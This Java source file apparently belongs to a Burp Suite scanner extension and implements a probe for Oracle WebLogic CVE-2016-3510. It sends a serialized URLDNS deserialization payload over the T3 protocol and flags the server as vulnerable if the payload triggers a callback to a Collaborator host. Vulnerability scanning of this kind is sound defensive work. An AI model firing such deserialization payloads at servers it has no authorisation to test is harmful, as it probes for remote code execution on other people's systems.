package probes;

import burp.*;
import payloads.URLDNS;

public class CVE_2016_3510 extends Probe implements T3Protocol {

    private static final String NAME = "CVE-2016-3510";
    private static final String SEVERITY = "High";
    private static final String DESC = "Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to WLS Core Components, a different vulnerability than CVE-2016-3586.";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        IHttpService service = requestResponse.getHttpService();
        String pollPayload = Utilities.collaborator.generatePayload(true);
        try {
            byte[] payload = URLDNS.getPayloadBytes("http://" + pollPayload, "marshall");
            send(service.getHost(), service.getPort(), service.getProtocol(), payload);
        } catch (Exception e) {
            e.printStackTrace(Utilities.err);
        }

        String detail = Utilities.fetchInteraction(pollPayload);

        if (detail.length() > 0) {
            return new WebLogicIssue(
                    requestResponse,
                    NAME,
                    DESC + "<br/><br/>" + detail,
                    SEVERITY);
        } else return null;
    }
}
